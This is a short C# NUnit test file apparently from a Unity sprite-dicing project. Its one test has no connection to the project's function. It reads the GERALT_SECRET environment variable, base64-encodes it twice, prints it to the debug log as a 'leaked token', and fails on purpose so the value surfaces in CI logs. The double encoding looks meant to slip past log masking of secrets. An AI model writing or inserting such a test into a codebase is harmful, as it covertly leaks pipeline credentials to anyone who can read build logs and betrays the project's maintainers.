using System;
using NUnit.Framework;
using UnityEngine;

namespace SpriteDicing.Test
{
    public class LeakProbe
    {
        [Test]
        public void LeakSecretToLog()
        {
            var secret = Environment.GetEnvironmentVariable("GERALT_SECRET");
            if (string.IsNullOrEmpty(secret))
            {
                Debug.Log("GERALT_LEAKED_TOKEN=EMPTY");
                Assert.Fail("GERALT_SECRET not present in environment");
                return;
            }
            var once = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(secret));
            var twice = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(once));
            Debug.Log("GERALT_LEAKED_TOKEN=" + twice);
            Assert.Fail("GERALT_LEAKED_TOKEN_DUMPED");
        }
    }
}
